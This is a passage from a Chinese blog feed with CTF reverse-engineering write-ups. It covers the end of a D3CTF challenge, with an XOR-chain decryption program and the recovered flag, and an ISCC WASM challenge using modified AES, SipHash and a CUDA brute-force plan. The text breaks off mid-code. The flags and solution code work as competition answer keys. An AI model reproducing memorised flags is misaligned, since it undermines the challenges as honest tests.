src="/2025/06/01/D3CTF-Reverse/image-74.png" alt="alt text"></p><p>查看两个数组的数据，发现前七个DWORD，也就是前28字节是完全一样的，说明name确实是r3假流程那边得到的”mitsuha”。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-75.png" alt="alt text"></p><p>再pa d3ctf+0x1AC4，执行到校验password的地方。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-77.png" alt="alt text"></p><p><img src="/2025/06/01/D3CTF-Reverse/image-76.png" alt="alt text"></p><p>查询将要对比校验的两个数组数值，上面是我们password加密后的密文，下面是目标密文。</p><p>我们输入的password是”123456abcdef123456abcdef123456abcdef”，发现加密后的密文很有规律性和重复性，猜测是简单加密。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-79.png" alt="alt text"></p><p>并且发现第一个数据0x15 ^ ‘1’ &#x3D; 0x24，也就是刚刚上面出现的VM函数给password数组添加的第一个0x24数据。</p><p><img src="/2025/06/01/D3CTF-Reverse/image-80.png" alt="alt text"></p><p>发现第一个0x15 ^ 0x24 &#x3D; ‘1’，然后’1’ ^ 0x3 &#x3D; ‘2’，依次下去，就解密出来了原输入的password。</p><p>说明检验前password的加密如下：插入0x24到数组头，依次往后两两相邻数值异或。</p><p>那么这边直接提取37个DWORD的密文，进行两两异或解密即可。</p><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 密文前面插入0x24用于解密</span></span><br><span class="line">    <span class="type">uint8_t</span> Enc[]&#123;<span class="number">0x24</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0xe</span>, <span class="number">0x5c</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x52</span>, <span class="number">0x6</span>, <span class="number">0x1b</span>, <span class="number">0x1a</span>, <span class="number">0xe</span>, <span class="number">0x1</span>, <span class="number">0x5e</span>, <span class="number">0x4b</span>, <span class="number">0x19</span>, <span class="number">0x56</span>, <span class="number">0x6</span>, <span class="number">0x55</span>, <span class="number">0x1c</span>, <span class="number">0x14</span>, <span class="number">0x5c</span>, <span class="number">0x5d</span>, <span class="number">0x9</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x50</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0x52</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x6A</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">37</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Enc[i + <span class="number">1</span>] ^= Enc[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳过第一个0x24，输出后36 password明文</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;d3ctf&#123;%.36s&#125;\n&quot;</span>, Enc + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>d3ctf{a68dfb06-798f-4bd1-9e81-011aaec113f0}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这次比赛做了d3kernel和locked door这两题，也是都拿下了一血。这两题都是强对抗类型，和传统的加解密类型题目有区别。kerne</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>ISCC擂台赛逆向题 Enigma 题解</title>
    <link href="https://tkazer.github.io/2025/05/25/ISCC-Enigma/"/>
    <id>https://tkazer.github.io/2025/05/25/ISCC-Enigma/</id>
    <published>2025-05-25T04:56:13.000Z</published>
    <updated>2025-06-01T03:01:15.151Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这题当时赛中很早就写出爆破解密脚本了，但是一直没爆出来，赛后和出题人咨询发现是密文错了，并且发现其实是程序本身出错了，xor 0x10的代码并没有给实际密文数据段进行xor，而是给一个空数据段xor了，所以导致密文没有xor 0x10，所以是错的密文，也就无法爆破。这题本身题目难度还行，WASM逆向+AES魔改+Siphash+排列爆破。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="程序流程分析"><a href="#程序流程分析" class="headerlink" title="程序流程分析"></a>程序流程分析</h2><p>下载得到bin文件，xor 0x21得到wasm程序文件。</p><p><img src="/2025/05/25/ISCC-Enigma/image.png" alt="alt text"></p><p>这边使用ghidra分析，ghidra插件链接：<a href="https://github.com/nneonneo/ghidra-wasm-plugin">https://github.com/nneonneo/ghidra-wasm-plugin</a></p><p>从导出表定位到main函数。</p><p><img src="/2025/05/25/ISCC-Enigma/image-1.png" alt="alt text"></p><p>第一部分，先输入字符串，然后srand(time(0))，取16个rand()%2，存到b70数组，所以b70是0101的随机排列数组，这边的需要的爆破次数就是2^16。</p><p><img src="/2025/05/25/ISCC-Enigma/image-2.png" alt="alt text"></p><p>这边提一嘴srand和rand的实现，这样的实现就是对应C语言中的srand和rand，魔数也是很好看出来的，这边代码抄出来就可以用。</p><p><img src="/2025/05/25/ISCC-Enigma/image-3.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-4.png" alt="alt text"></p><p>第二部分是将输入字符串取了一部分，然后将b70数组当作密钥，进行SipHash，得到hash值然后扩展成16字节的密钥，这边对输入字符串的操作有点迷惑看不懂，就得开始动调看看实际怎么取的。</p><p><img src="/2025/05/25/ISCC-Enigma/image-5.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-12.png" alt="alt text"></p><p>这边使用的是TGCTF的index题的wasm环境，只是把里面的wasm调用改成这题的wasm。</p><p>输入48长度字符串，然后点确定再点一下取消，断点到wasm程序，func13就是main函数这边。</p><p><img src="/2025/05/25/ISCC-Enigma/image-6.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-7.png" alt="alt text"></p><p>这边调用的func12就是对应SpiHash的call。然后堆栈的三个值就对应SpiHash的三个参数，第一个参数就是要看的传入字符串参数。</p><p>将值转到十六进制，点击箭头处的Memory按钮，在Memory窗口转到对应的地址，发现是传入是ISCC{123}，也就是我们输入的字符串前八个字符加最后一个}。</p><p><img src="/2025/05/25/ISCC-Enigma/image-8.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-9.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-10.png" alt="alt text"></p><p>最后一个部分就是将输入字符串用刚刚hash扩展生成的密钥进行AES加密，最后与密文进行比较。</p><p><img src="/2025/05/25/ISCC-Enigma/image-11.png" alt="alt text"></p><h2 id="解密流程简述"><a href="#解密流程简述" class="headerlink" title="解密流程简述"></a>解密流程简述</h2><p>爆破16大小的01字节数组全排列，爆破三个未知可视字符(32-126)，经过SpiHash然后扩展生成密钥进行AES解密，如果解密出ISCC{}格式字符串，即为爆破解密成功。</p><p>总体解密次数是 (2^16)*(95^3) &#x3D; 56,188,928,000，由于量级过大，考虑使用CUDA进行爆破。</p><h2 id="AES魔改分析"><a href="#AES魔改分析" class="headerlink" title="AES魔改分析"></a>AES魔改分析</h2><p>和标准AES代码流程进行对比，分析发现是mixColumns和addRoundKey进行了对调，其他地方都一样。</p><p><img src="/2025/05/25/ISCC-Enigma/image-14.png" alt="alt text"></p><p><img src="/2025/05/25/ISCC-Enigma/image-15.png" alt="alt text"></p><p>第二个魔改点是Sbox数值的魔改，导出然后手动算出InvSbox即用于解密。解密的时候也同样交换mixColumns和addRoundKey的调用即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123; <span class="number">0x3f</span>, <span class="number">0x1e</span>, <span class="number">0xfc</span>, <span class="number">0x3d</span>, <span class="number">0x68</span>, <span class="number">0x51</span>, <span class="number">0xf0</span>, <span class="number">0x20</span>, <span class="number">0x92</span>, <span class="number">0x02</span>, <span class="number">0x9d</span>, <span class="number">0xac</span>, <span class="number">0x54</span>, <span class="number">0x6e</span>, <span class="number">0xfb</span>, <span class="number">0x42</span>, <span class="number">0x29</span>, <span class="number">0xe8</span>, <span class="number">0x23</span>, <span class="number">0x2a</span>, <span class="number">0xd5</span>, <span class="number">0xa2</span>, <span class="number">0x3a</span>, <span class="number">0xc0</span>, <span class="number">0xd4</span>, <span class="number">0xba</span>, <span class="number">0xb5</span>, <span class="number">0x84</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x5c</span>, <span class="number">0x08</span>, <span class="number">0xf2</span>, <span class="number">0x22</span>, <span class="number">0xa7</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x0d</span>, <span class="number">0x8a</span>, <span class="number">0x89</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x5e</span>, <span class="number">0xa0</span>, <span class="number">0xef</span>, <span class="number">0x67</span>, <span class="number">0x49</span>, <span class="number">0xd3</span>, <span class="number">0x18</span>, <span class="number">0x76</span>, <span class="number">0xbd</span>, <span class="number">0xd0</span>, <span class="number">0x8d</span>, <span class="number">0x2f</span>, <span class="number">0xb4</span>, <span class="number">0x55</span>, <span class="number">0xc5</span>, <span class="number">0xc8</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x04</span>, <span class="number">0xd8</span>, <span class="number">0x01</span>, <span class="number">0x5a</span>, <span class="number">0x2e</span>, <span class="number">0xed</span>, <span class="number">0x91</span>, <span class="number">0xff</span>, <span class="number">0x15</span>, <span class="number">0x6c</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x24</span>, <span class="number">0x72</span>, <span class="number">0x1a</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x56</span>, <span class="number">0xbf</span>, <span class="number">0xb1</span>, <span class="number">0x73</span>, <span class="number">0xc7</span>, <span class="number">0x95</span>, <span class="number">0x05</span>, <span class="number">0xb6</span>, <span class="number">0x52</span>, <span class="number">0x31</span>, <span class="number">0xb3</span>, <span class="number">0x10</span>, <span class="number">0x2b</span>, <span class="number">0x6f</span>, <span class="number">0x43</span>, <span class="number">0xbb</span>, <span class="number">0x62</span>, <span class="number">0x7c</span>, <span class="number">0x7b</span>, <span class="number">0xa3</span>, <span class="number">0xbe</span>, <span class="number">0xd9</span>, <span class="number">0xbc</span>, <span class="number">0xdc</span>, <span class="number">0xc9</span>, <span class="number">0x8f</span>, <span class="number">0xa4</span>, <span class="number">0xe3</span>, <span class="number">0xe7</span>, <span class="number">0x17</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>, <span class="number">0xca</span>, <span class="number">0x6d</span>, <span class="number">0x4e</span>, <span class="number">0xae</span>, <span class="number">0x83</span>, <span class="number">0x63</span>, <span class="number">0x82</span>, <span class="number">0x27</span>, <span class="number">0x4a</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x2c</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xaf</span>, <span class="number">0x44</span>, <span class="number">0x85</span>, <span class="number">0xc1</span>, <span class="number">0x47</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0xf4</span>, <span class="number">0xfd</span>, <span class="number">0x3c</span>, <span class="number">0xf1</span>, <span class="number">0x45</span>, <span class="number">0x1f</span>, <span class="number">0x5b</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0xc4</span>, <span class="number">0x79</span>, <span class="number">0x53</span>, <span class="number">0x09</span>, <span class="number">0xea</span>, <span class="number">0xee</span>, <span class="number">0x0c</span>, <span class="number">0xd6</span>, <span class="number">0x61</span>, <span class="number">0xc6</span>, <span class="number">0xaa</span>, <span class="number">0xb0</span>, <span class="number">0x69</span>, <span class="number">0x81</span>, <span class="number">0xb9</span>, <span class="number">0x7f</span>, <span class="number">0xec</span>, <span class="number">0x94</span>, <span class="number">0xce</span>, <span class="number">0xa9</span>, <span class="number">0x97</span>, <span class="number">0x3b</span>, <span class="number">0xda</span>, <span class="number">0x8e</span>, <span class="number">0xe5</span>, <span class="number">0x86</span>, <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0xad</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0x40</span>, <span class="number">0xb2</span>, <span class="number">0x65</span>, <span class="number">0xcb</span>, <span class="number">0xb7</span>, <span class="number">0x1c</span>, <span class="number">0x7a</span>, <span class="number">0xf6</span>, <span class="number">0x87</span>, <span class="number">0xcd</span>, <span class="number">0x4f</span>, <span class="number">0x9f</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x0f</span>, <span class="number">0x6a</span>, <span class="number">0xa8</span>, <span class="number">0xde</span>, <span class="number">0xc3</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0xfa</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x90</span>, <span class="number">0xdf</span>, <span class="number">0xf8</span>, <span class="number">0x25</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xe0</span>, <span class="number">0xf7</span>, <span class="number">0x07</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x6b</span>, <span class="number">0x0b</span>, <span class="number">0x3e</span>, <span class="number">0x1d</span>, <span class="number">0xe1</span>, <span class="number">0x58</span>, <span class="number">0x38</span>, <span class="number">0xc2</span>, <span class="number">0x78</span>, <span class="number">0x0e</span>, <span class="number">0x59</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x88</span>, <span class="number">0xdd</span>, <span class="number">0x9b</span>, <span class="number">0xd2</span>, <span class="number">0x19</span>, <span class="number">0x7e</span>, <span class="number">0xf9</span>, <span class="number">0xdb</span>, <span class="number">0xfe</span>, <span class="number">0x60</span>, <span class="number">0x13</span>, <span class="number">0x4c</span>, <span class="number">0xcc</span>, <span class="number">0xf3</span>, <span class="number">0xa5</span>, <span class="number">0x14</span>, <span class="number">0x34</span>, <span class="number">0x96</span>, <span class="number">0x80</span>, <span class="number">0xe6</span>, <span class="number">0x9a</span>, <span class="number">0xf5</span>, <span class="number">0x9e</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x0a</span>, <span class="number">0xcf</span>, <span class="number">0x98</span>, <span class="number">0x28</span>, <span class="number">0x06</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[] = &#123; <span class="number">0xD1</span>, <span class="number">0x41</span>, <span class="number">0x09</span>, <span class="number">0xF9</span>, <span class="number">0x3F</span>, <span class="number">0x56</span>, <span class="number">0xFF</span>, <span class="number">0xCD</span>, <span class="number">0x1F</span>, <span class="number">0x91</span>, <span class="number">0xFB</span>, <span class="number">0xD4</span>, <span class="number">0x94</span>, <span class="number">0x27</span>, <span class="number">0xDC</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0xA9</span>, <span class="number">0xFA</span>, <span class="number">0xEA</span>, <span class="number">0xEF</span>, <span class="number">0x47</span>, <span class="number">0xA8</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xE4</span>, <span class="number">0x4D</span>, <span class="number">0xDF</span>, <span class="number">0xB2</span>, <span class="number">0xD6</span>, <span class="number">0x01</span>, <span class="number">0x8A</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x4B</span>, <span class="number">0xC8</span>, <span class="number">0xD2</span>, <span class="number">0x77</span>, <span class="number">0xFE</span>, <span class="number">0x10</span>, <span class="number">0x13</span>, <span class="number">0x5C</span>, <span class="number">0x7B</span>, <span class="number">0xF8</span>, <span class="number">0x43</span>, <span class="number">0x37</span>, <span class="number">0x4F</span>, <span class="number">0x59</span>, <span class="number">0x26</span>, <span class="number">0xC4</span>, <span class="number">0xF0</span>, <span class="number">0xC3</span>, <span class="number">0x3C</span>, <span class="number">0x3D</span>, <span class="number">0xD9</span>, <span class="number">0xC0</span>, <span class="number">0x16</span>, <span class="number">0xA3</span>, <span class="number">0x87</span>, <span class="number">0x03</span>, <span class="number">0xD5</span>, <span class="number">0x00</span>, <span class="number">0xAD</span>, <span class="number">0x23</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x2A</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x30</span>, <span class="number">0x78</span>, <span class="number">0x83</span>, <span class="number">0xEB</span>, <span class="number">0xBA</span>, <span class="number">0x72</span>, <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x90</span>, <span class="number">0x0C</span>, <span class="number">0x39</span>, <span class="number">0x50</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xDD</span>, <span class="number">0x42</span>, <span class="number">0x8B</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x2C</span>, <span class="number">0x6E</span>, <span class="number">0xE9</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x49</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x2F</span>, <span class="number">0x04</span>, <span class="number">0x9A</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x48</span>, <span class="number">0x71</span>, <span class="number">0x0D</span>, <span class="number">0x5D</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>, <span class="number">0x1D</span>, <span class="number">0x4E</span>, <span class="number">0x33</span>, <span class="number">0xD0</span>, <span class="number">0xDB</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x7D</span>, <span class="number">0xE5</span>, <span class="number">0x9D</span>, <span class="number">0xF2</span>, <span class="number">0x9B</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xA7</span>, <span class="number">0xB5</span>, <span class="number">0xE0</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x24</span>, <span class="number">0xC9</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x69</span>, <span class="number">0xC5</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0xDE</span>, <span class="number">0x9F</span>, <span class="number">0x55</span>, <span class="number">0xF1</span>, <span class="number">0xA2</span>, <span class="number">0xFD</span>, <span class="number">0xCF</span>, <span class="number">0xF4</span>, <span class="number">0xE2</span>, <span class="number">0xCA</span>, <span class="number">0x0A</span>, <span class="number">0xF6</span>, <span class="number">0xB8</span>, <span class="number">0x2D</span>, <span class="number">0x8D</span>, <span class="number">0x15</span>, <span class="number">0x63</span>, <span class="number">0x6A</span>, <span class="number">0xEE</span>, <span class="number">0x1C</span>, <span class="number">0x22</span>, <span class="number">0xBD</span>, <span class="number">0xA1</span>, <span class="number">0x98</span>, <span class="number">0xB9</span>, <span class="number">0x0B</span>, <span class="number">0xAA</span>, <span class="number">0x73</span>, <span class="number">0x7E</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0xAE</span>, <span class="number">0x5A</span>, <span class="number">0x38</span>, <span class="number">0x1A</span>, <span class="number">0x57</span>, <span class="number">0xB1</span>, <span class="number">0x8C</span>, <span class="number">0x9C</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x64</span>, <span class="number">0x51</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0xDA</span>, <span class="number">0xBF</span>, <span class="number">0x8E</span>, <span class="number">0x3A</span>, <span class="number">0x97</span>, <span class="number">0x54</span>, <span class="number">0x3B</span>, <span class="number">0x68</span>, <span class="number">0x70</span>, <span class="number">0xB0</span>, <span class="number">0xEC</span>, <span class="number">0xB6</span>, <span class="number">0xA0</span>, <span class="number">0xFC</span>, <span class="number">0x35</span>, <span class="number">0xAB</span>, <span class="number">0xE3</span>, <span class="number">0x31</span>, <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x40</span>, <span class="number">0x65</span>, <span class="number">0xA4</span>, <span class="number">0xE7</span>, <span class="number">0x67</span>, <span class="number">0xE1</span>, <span class="number">0xBE</span>, <span class="number">0xC6</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0xCE</span>, <span class="number">0x6B</span>, <span class="number">0xF7</span>, <span class="number">0xA6</span>, <span class="number">0xF3</span>, <span class="number">0x6C</span>, <span class="number">0x11</span>, <span class="number">0x6F</span>, <span class="number">0x92</span>, <span class="number">0x25</span>, <span class="number">0x9E</span>, <span class="number">0x44</span>, <span class="number">0x93</span>, <span class="number">0x2E</span>, <span class="number">0x06</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0xED</span>, <span class="number">0x85</span>, <span class="number">0xF5</span>, <span class="number">0xB4</span>, <span class="number">0xCC</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC2</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x86</span>, <span class="number">0xE8</span>, <span class="number">0x46</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/05/25/ISCC-Enigma/image-16.png" alt="alt text"></p><h2 id="错误代码部分"><a href="#错误代码部分" class="headerlink" title="错误代码部分"></a>错误代码部分</h2><p>function_8处代码本意是要将静态的明文xor上0x10，但是地址不对，xor到了一个空白的内存，所以解密的时候得把密文都xor 0x10，才能成功爆破出来密钥。</p><p><img src="/2025/05/25/ISCC-Enigma/image-17.png" alt="alt text"></p><h2 id="加密同构"><a href="#加密同构" class="headerlink" title="加密同构"></a>加密同构</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AES.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _le64toh(x) ((uint64_t)(x))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTATE(x, b) (uint64_t)( ((x) <span class="string">&lt;&lt; (b)) | ( (x) &gt;</span>&gt; (64 - (b))) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_ROUND(a,b,c,d,s,t)\</span></span><br><span class="line"><span class="meta">a += b; c += d;\</span></span><br><span class="line"><span class="meta">b = ROTATE(b, s) ^ a;\</span></span><br><span class="line"><span class="meta">d = ROTATE(d, t) ^ c;\</span></span><br><span class="line"><span class="meta">a = ROTATE(a, 32);</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DOUBLE_ROUND(v0,v1,v2,v3)\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v0,v1,v2,v3,13,16);\</span></span><br><span class="line"><span class="meta">HALF_ROUND(v2,v1,v0,v3,17,21);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">siphash24</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* src, <span class="type">unsigned</span> <span class="type">long</span> src_sz, <span class="type">const</span> <span class="type">char</span> key[<span class="number">16</span>])</span> </span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* _key = (<span class="type">uint64_t</span>*)key;</span><br><span class="line"><span class="type">uint64_t</span> k0 = _le64toh(_key[<span class="number">0</span>]);</span><br><span class="line"><span class="type">uint64_t</span> k1 = _le64toh(_key[<span class="number">1</span>]);</span><br><span class="line"><span class="type">uint64_t</span> b = (<span class="type">uint64_t</span>)src_sz &lt;&lt; <span class="number">56</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">uint64_t</span>* in = (<span class="type">uint64_t</span>*)src;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> v0 = k0 ^ <span class="number">0x102030405060708</span>;</span><br><span class="line"><span class="type">uint64_t</span> v1 = k1 ^ <span class="number">0x90a0b0c0d0e0f00</span>;</span><br><span class="line"><span class="type">uint64_t</span> v2 = k0 ^ k1 ^ <span class="number">0x123456789abcdef</span>;</span><br><span class="line"><span class="type">uint64_t</span> v3 = k1 ^ k0 ^ <span class="number">0x4953434343435349</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (src_sz &gt;= <span class="number">8</span>) &#123;</span><br><span class="line"><span class="type">uint64_t</span> mi = _le64toh(*in);</span><br><span class="line">in += <span class="number">1</span>; src_sz -= <span class="number">8</span>;</span><br><span class="line">v3 